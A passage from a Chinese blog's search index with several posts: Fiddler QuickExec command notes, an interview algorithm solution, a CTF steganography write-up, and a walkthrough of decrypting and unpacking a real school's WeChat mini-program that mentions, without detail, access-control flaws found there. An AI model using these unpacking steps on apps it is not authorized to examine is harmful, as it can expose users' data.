<h3 id="导出所有sessions，打包为zip到C"><a href="#导出所有sessions，打包为zip到C" class="headerlink" title="导出所有sessions，打包为zip到C:\"></a>导出所有sessions，打包为zip到C:\</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dump</span><br></pre></td></tr></table></figure>

<h3 id="恢复所有中断会话"><a href="#恢复所有中断会话" class="headerlink" title="恢复所有中断会话"></a>恢复所有中断会话</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">g</span><br><span class="line">go</span><br></pre></td></tr></table></figure>

<h3 id="帮助页面"><a href="#帮助页面" class="headerlink" title="帮助页面"></a>帮助页面</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">help</span><br></pre></td></tr></table></figure>

<p><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnRlbGVyaWsuY29tL2ZpZGRsZXIva25vd2xlZGdlYmFzZS9xdWlja2V4ZWM=">https://docs.telerik.com/fiddler/knowledgebase/quickexec<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="替换掉URL中的指定字符串"><a href="#替换掉URL中的指定字符串" class="headerlink" title="替换掉URL中的指定字符串"></a>替换掉URL中的指定字符串</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">urlreplace SeekStr ReplaceWithStr</span><br><span class="line">urlreplace      # Call with no parameters to clear</span><br></pre></td></tr></table></figure>

<h3 id="启动系统代理-开启抓包"><a href="#启动系统代理-开启抓包" class="headerlink" title="启动系统代理/开启抓包"></a>启动系统代理/开启抓包</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">start</span><br></pre></td></tr></table></figure>

<h3 id="关闭系统代理-关闭抓包"><a href="#关闭系统代理-关闭抓包" class="headerlink" title="关闭系统代理/关闭抓包"></a>关闭系统代理/关闭抓包</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stop</span><br></pre></td></tr></table></figure>

<h3 id="选择指定文件类型-Content-Type-的Sessions"><a href="#选择指定文件类型-Content-Type-的Sessions" class="headerlink" title="选择指定文件类型(Content-Type)的Sessions"></a>选择指定文件类型(Content-Type)的Sessions</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select image</span><br><span class="line">select css</span><br><span class="line">select htm</span><br></pre></td></tr></table></figure>

<h3 id="选择拥有指定Header或者SessionFlag的Sessions"><a href="#选择拥有指定Header或者SessionFlag的Sessions" class="headerlink" title="选择拥有指定Header或者SessionFlag的Sessions"></a>选择拥有指定Header或者SessionFlag的Sessions</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select ui-comments slow</span><br><span class="line">select ui-bold *                     # unless preceded by a slash, * means any value</span><br><span class="line">select ui-comments \*                # Find comments with a *</span><br><span class="line">select @Request.Accept html          # Find requests with Accept: html</span><br><span class="line">select @Response.Set-Cookie domain   # Find responses that Set-Cookie on a domain</span><br></pre></td></tr></table></figure>

<h3 id="隐藏除了指定文件类型-Content-Type-的其它会话"><a href="#隐藏除了指定文件类型-Content-Type-的其它会话" class="headerlink" title="隐藏除了指定文件类型(Content-Type)的其它会话"></a>隐藏除了指定文件类型(Content-Type)的其它会话</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">allbut xml</span><br><span class="line">allbut java</span><br><span class="line">keeponly xml</span><br><span class="line">keeponly java</span><br></pre></td></tr></table></figure>

<h3 id="关闭Fiddler"><a href="#关闭Fiddler" class="headerlink" title="关闭Fiddler"></a>关闭Fiddler</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">quit</span><br></pre></td></tr></table></figure>

<h3 id="dns查询"><a href="#dns查询" class="headerlink" title="dns查询"></a>dns查询</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">!dns www.example.com</span><br><span class="line">!nslookup www.example.com</span><br></pre></td></tr></table></figure>

<h3 id="FiddlerScript-CookBook-Customize-Rules-ScriptSamples"><a href="#FiddlerScript-CookBook-Customize-Rules-ScriptSamples" class="headerlink" title="FiddlerScript CookBook/Customize Rules ScriptSamples"></a>FiddlerScript CookBook/Customize Rules ScriptSamples</h3><p><span class="exturl" data-url="aHR0cDovL2ZpZGRsZXJib29rLmNvbS9GaWRkbGVyL2Rldi9TY3JpcHRTYW1wbGVzLmFzcA==">http://fiddlerbook.com/Fiddler/dev/ScriptSamples.asp<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>note</tag>
        <tag>Fiddler</tag>
        <tag>web</tag>
        <tag>抓包</tag>
      </tags>
  </entry>
  <entry>
    <title>某一面凉经</title>
    <url>/2020/09/10/huawei-1mian/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>题目我没截图，大概说说流程。</p>
<p>输入<code>N</code>，<code>P</code>，分别代表字符串长度和可用的<strong>小写字母</strong>的前多少位，如<code>N=3</code>，<code>P=4</code>，用正则表达式表示就是<code>[a-d]{4}</code>。然后按照字典序，找到最小的下一个不包含回文串的字符串，不存在则输出<code>NO</code>。如<code>cba</code>，接下来就是<code>cbb</code>、<code>cbc</code>，这两个都包含回文串，所以输出<code>cbd</code>。</p>
<ul>
<li>样例：</li>
</ul>
<p>输入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3 3</span><br><span class="line">cba</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NO</span><br></pre></td></tr></table></figure>

<h2 id="面试时候的思路"><a href="#面试时候的思路" class="headerlink" title="面试时候的思路"></a>面试时候的思路</h2><p>因为是早上9点半面试，7点半就起来吃早餐了（太早了脑子还没转过来）。面试的时候9点半，然后面试官还咕了有十几分钟吧。那时候心态就有点崩了。</p>
<p><strong>面试官：半小时做一道算法题</strong></p>
<p>说实话，我不太喜欢被盯着编程，（高中竞赛的时候被老师盯着就会没思路），虽然面试官也看不到我屏幕吧，而且是隔着屏幕盯着的，但是它限时30分钟，再加上我有点紧张，所以我还是心态崩了（x，可能也有很久没做算法题的缘故吧，反正那时候就想复杂了。</p>
<p>那时候想的是用搜索遍历出后续的字符串，然后看到回文串就想到了利用逆序字符串找最长公共子序列，当时脑子一片浆糊，没想太多就开始编了，而且用的还是python（x，<code>你说用C++多好，别人不需要python工程师</code></p>
<p>结果当然就是凉了，写了一堆bug能不凉嘛，哪位小天才用深搜遍历的？这不是自找麻烦嘛。</p>
<h2 id="凉了之后躺床上的思路"><a href="#凉了之后躺床上的思路" class="headerlink" title="凉了之后躺床上的思路"></a>凉了之后躺床上的思路</h2><p>放松下来之后就想到了题解了</p>
<p>遍历字典序很简单，其实就是一个P进制的加法器，一直加，有进位就往上进一位就是了，如果最高位溢出就代表遍历完了。</p>
<p>然后就是检测回文串，题目要求的是存在回文串就pass，所以没必要检测最长的回文串，只要看有没有就行了，所以只需要检测存不存在以下两种情况</p>
<ul>
<li>s[i]==s[i-1]</li>
<li>s[i]==s[i-2]</li>
</ul>
<p>也就是aa或者aba类型的回文串，存在就可以直接pass了</p>
<p>躺床上，越想越气，这么简单的题都没做出来，然后就下床写下这个教训（</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h3><p>别人需要的是<code>C/C++</code>的工程师，那我就先用<code>C++</code>写一个</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, p;</span><br><span class="line"><span class="keyword">char</span> c;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; n &gt;&gt; p; <span class="comment">// 读字符串长度和可用字母位数</span></span><br><span class="line">	<span class="keyword">int</span>* s = <span class="keyword">new</span> <span class="keyword">int</span>[n + <span class="number">1</span>]; <span class="comment">// 字符串转成数字，存在这，大端序</span></span><br><span class="line">	s[<span class="number">0</span>] = <span class="number">0</span>; <span class="comment">// 0位充当溢出位，初始化为0</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n+<span class="number">1</span>; i++) &#123; <span class="comment">// 读初始字符串，赋值到P进制加法器</span></span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; c;</span><br><span class="line">		s[i] = <span class="keyword">int</span>(c)<span class="number">-97</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">bool</span> flag = <span class="literal">true</span>; <span class="comment">// 是否有输出的标志位</span></span><br><span class="line">	<span class="keyword">while</span> (s[<span class="number">0</span>]==<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">int</span> d = <span class="number">1</span>; <span class="comment">// 进位数</span></span><br><span class="line">		<span class="keyword">int</span> i = n; <span class="comment">// 第几位进位</span></span><br><span class="line">		<span class="keyword">while</span> (d) &#123;</span><br><span class="line">			d = (s[i] + <span class="number">1</span>) / p;</span><br><span class="line">			s[i] = (s[i] + <span class="number">1</span>) % p;</span><br><span class="line">			i--;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">bool</span> hw=<span class="literal">false</span>; <span class="comment">// 是否是回文数</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">2</span>; j &lt; n + <span class="number">1</span>; j++) &#123; <span class="comment">// 被改变位与其相邻位检测</span></span><br><span class="line">			<span class="keyword">if</span> (s[j - <span class="number">1</span>] == s[j]) &#123;</span><br><span class="line">				hw = <span class="literal">true</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (hw) &#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">3</span>; j &lt; n + <span class="number">1</span>; j++) &#123; <span class="comment">// 被改变位与其隔位检测</span></span><br><span class="line">			<span class="keyword">if</span> (s[j - <span class="number">2</span>] == s[j]) &#123;</span><br><span class="line">				hw = <span class="literal">true</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (hw) &#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (s[<span class="number">0</span>] == <span class="number">1</span>) &#123; <span class="comment">// 溢出，直接终止，虽然这个运行不到（x</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		flag = <span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (flag) &#123; <span class="comment">// 无结果，输出NO</span></span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"NO"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123; <span class="comment">// 输出结果</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n + <span class="number">1</span>; i++) &#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="keyword">char</span>(s[i]+<span class="number">97</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p>python就不做注释了（懒，和C++差不多</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">n, p = sys.stdin.readline().split()</span><br><span class="line">n = int(n)</span><br><span class="line">p = int(p)</span><br><span class="line">s = [<span class="number">0</span>]+[x<span class="number">-97</span> <span class="keyword">for</span> x <span class="keyword">in</span> sys.stdin.readline().encode()]</span><br><span class="line">flag = <span class="literal">True</span></span><br><span class="line"><span class="keyword">while</span> s[<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">    d = <span class="number">1</span></span><br><span class="line">    i = n</span><br><span class="line">    <span class="keyword">while</span> d:</span><br><span class="line">        d = (s[i]+<span class="number">1</span>)//p</span><br><span class="line">        s[i] = (s[i]+<span class="number">1</span>) % p</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">    hw = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">2</span>, n+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> (s[j<span class="number">-1</span>] == s[j]):</span><br><span class="line">            hw = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> hw:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">3</span>, n+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> (s[j<span class="number">-2</span>] == s[j]):</span><br><span class="line">            hw = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> hw:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> s[<span class="number">0</span>] == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    print(<span class="string">'NO'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(bytes([x+<span class="number">97</span> <span class="keyword">for</span> x <span class="keyword">in</span> s[<span class="number">1</span>:]]).decode())</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>面试</tag>
        <tag>凉经</tag>
        <tag>一面</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次微信小程序逆向</title>
    <url>/2020/10/16/wxapkg/</url>
    <content><![CDATA[<h2 id="〇、目标"><a href="#〇、目标" class="headerlink" title="〇、目标"></a>〇、目标</h2><p>选择学校的迎新服务小程序入手，因为之前抓过包，初步判断逻辑比较简单</p>
<h2 id="一、找到wxapkg"><a href="#一、找到wxapkg" class="headerlink" title="一、找到wxapkg"></a>一、找到wxapkg</h2><p>用虚拟机运行微信，打开小程序，在以下目录找到wxapkg</p>
<p><code>/data/data/com.tencent.mm/MicroMsg/{User}/appbrand/pkg</code></p>
<p>或者直接在pc中打开小程序，在以下目录找到wxapkg</p>
<p><code>%UserProfile%\Documents\WeChat Files\Applet</code></p>
<h2 id="二、解密"><a href="#二、解密" class="headerlink" title="二、解密"></a>二、解密</h2><p>可以看到PC端的wxapkg文件头是V1MMWX，是加密的，所以需要解密</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0JsYWNrVHJhY2UvcGNfd3hhcGtnX2RlY3J5cHQ=">https://github.com/BlackTrace/pc_wxapkg_decrypt<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="三、解包工具"><a href="#三、解包工具" class="headerlink" title="三、解包工具"></a>三、解包工具</h2><ul>
<li>wxappUnpacker</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/xuedingmiaojun/wxappUnpacker</span><br><span class="line"><span class="built_in">cd</span> wxappUnpacker</span><br><span class="line">npm install</span><br><span class="line">npm install esprima</span><br><span class="line">npm install css-tree</span><br><span class="line">npm install cssbeautify</span><br><span class="line">npm install vm2</span><br><span class="line">npm install uglify-es</span><br><span class="line">npm install js-beautify</span><br></pre></td></tr></table></figure>

<ul>
<li>mp-unpack</li>
</ul>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3h1ZWRpbmdtaWFvanVuL21wLXVucGFjaw==">https://github.com/xuedingmiaojun/mp-unpack<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="四、解包"><a href="#四、解包" class="headerlink" title="四、解包"></a>四、解包</h2><ul>
<li>使用wxappUnpacker</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./bingo.sh __APP__.wxapkg</span><br></pre></td></tr></table></figure>

<ul>
<li>或者mp-unpack</li>
</ul>
<p>直接拉进去解密</p>
<h2 id="五、源码分析"><a href="#五、源码分析" class="headerlink" title="五、源码分析"></a>五、源码分析</h2><p>因为代码有越权访问，甚至只要有手机号就可以登录，所以就不详细写出来了 :D</p>
<p>小程序的编写门槛低，安全问题也堪忧啊。</p>
<p>知乎流传的10秒报道url的源码 :D</p>
<p><img src="https://i.loli.net/2020/10/16/NIx68KpmkvzMTQS.png" alt="image-20201016130951846.png"></p>
]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>reverse</tag>
        <tag>wxapkg</tag>
        <tag>V1MMWX</tag>
        <tag>wechat</tag>
      </tags>
  </entry>
  <entry>
    <title>[2020第五空间线下赛] doublefreq</title>
    <url>/2020/12/09/5space2020/</url>
    <content><![CDATA[<p>解压得到一个 <code>flag.wav</code></p>
<p>用 <code>010editor</code> 打开发现数据都是 <code>FF FF</code> 和 <code>00 00</code></p>
<p>编写脚本将其提取出来并转换为 <code>1</code> 和 <code>0</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># extract.py</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">fin = open(<span class="string">'flag.wav'</span>, <span class="string">'rb'</span>)</span><br><span class="line">lfin = os.path.getsize(<span class="string">'flag.wav'</span>)</span><br><span class="line">fout = open(<span class="string">'flag.bin'</span>, <span class="string">'w'</span>)</span><br><span class="line">persent = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, lfin, <span class="number">2</span>):</span><br><span class="line">    b = fin.read(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> b == <span class="string">b'\xFF\xFF'</span>:</span><br><span class="line">        fout.write(<span class="string">'1'</span>)</span><br><span class="line">    <span class="keyword">elif</span> b == <span class="string">b'\x00\x00'</span>:</span><br><span class="line">        fout.write(<span class="string">'0'</span>)</span><br><span class="line">    tmp = i*<span class="number">100</span>//lfin</span><br><span class="line">    <span class="keyword">if</span> tmp &gt; persent:</span><br><span class="line">        persent = tmp</span><br><span class="line">        print(<span class="string">f'[+] extract <span class="subst">&#123;persent&#125;</span>%'</span>)</span><br><span class="line">fin.close()</span><br><span class="line">fout.close()</span><br></pre></td></tr></table></figure>

<p>用 <code>010editor</code> 打开提取的数据，发现 <code>bin</code> 码凑不整(不是8的倍数)，猜测有 <code>padding</code></p>
<p>搜索 <code>flag</code> 的 <code>bin</code> 码 <code>01100110011011000110000101100111</code></p>
<p>得到两个结果</p>
<p><img src="https://i.loli.net/2020/12/09/AOPyJ9qua5iRYC8.png" alt="image-20201209143534944.png"></p>
<p>观察可以得出 <code>padding</code> 为2，于是删掉开头的两个 <code>bin</code> 码将数据凑整。</p>
<p>编写脚本或使用 <code>CyberChef</code> 将 <code>bin</code> 码转换为文件，得到一个压缩包</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># transfor.py</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">fin = open(<span class="string">'flag.bin'</span>, <span class="string">'r'</span>)</span><br><span class="line">lfin = os.path.getsize(<span class="string">'flag.bin'</span>)</span><br><span class="line">fout = open(<span class="string">'flag.zip'</span>, <span class="string">'wb'</span>)</span><br><span class="line">persent = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, lfin, <span class="number">8</span>):</span><br><span class="line">    c = int(fin.read(<span class="number">8</span>), <span class="number">2</span>)</span><br><span class="line">    b = bytes([c])</span><br><span class="line">    fout.write(b)</span><br><span class="line">    tmp = i*<span class="number">100</span>//lfin</span><br><span class="line">    <span class="keyword">if</span> tmp &gt; persent:</span><br><span class="line">        persent = tmp</span><br><span class="line">        print(<span class="string">f'[+] transfor <span class="subst">&#123;persent&#125;</span>%'</span>)</span><br><span class="line">fin.close()</span><br><span class="line">fout.close()</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/12/09/BRXrEtI8bdFSV24.png" alt="image-20201209144716265.png"></p>
<p>解压得到一个加密的压缩包 <code>flag.rar</code> 和看着名字就像藏了密码的音频文件 <code>pass.wav</code></p>
<p>使用 <code>Adobe Audition</code> 打开 <code>pass.wav</code>，发现频谱图里有东西</p>
<p><img src="https://i.loli.net/2020/12/09/jocU7wREJMDtumA.png" alt="image-20201209150307325.png"></p>
<p>调整一下看得更清晰一些</p>
<p><img src="https://i.loli.net/2020/12/09/mfH3soyMZDwFbTV.png" alt="image-20201209150328599.png"></p>
<p>肉眼识别出 <code>BLXETPIKAPIKA</code></p>
<p>解压 <code>flag.rar</code> 得到 <code>flag.BMP</code> 和另一个加密的 <code>flag.rar</code></p>
<p>观察图片，发现图片上的颜色有断层的现象，形成了一道道波纹状</p>
<p><img src="https://i.loli.net/2020/12/09/dIcFrEO1taljnxW.png" alt="image-20201209151316322.png"></p>
<p>猜测是频域隐写，可以自己编写脚本进行傅里叶变换，或者使用现成的工具 <a href="http://nullice.com/imagein" target="_blank" rel="noopener"><code>imageIN</code></a></p>
<p>将图片拉进去之后，选择单色蓝色，可以看到有明显的字母</p>
<p><img src="https://i.loli.net/2020/12/09/HTnCwV82bW4Gx5O.png" alt="image-20201209151653043.png"></p>
<p><img src="https://i.loli.net/2020/12/09/tGex64PhAWuyUkE.png" alt="image-20201209151725729.png"></p>
<p>肉眼识别出密码 <code>PIKAAKIP</code></p>
<p>解压得到 <code>flag</code></p>
<blockquote>
<p>flag{&gt;You Play Misc Well _ lleW csiM yalP ouY &lt;}</p>
</blockquote>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>writeup</tag>
        <tag>5space</tag>
      </tags>
  </entry>
</search>
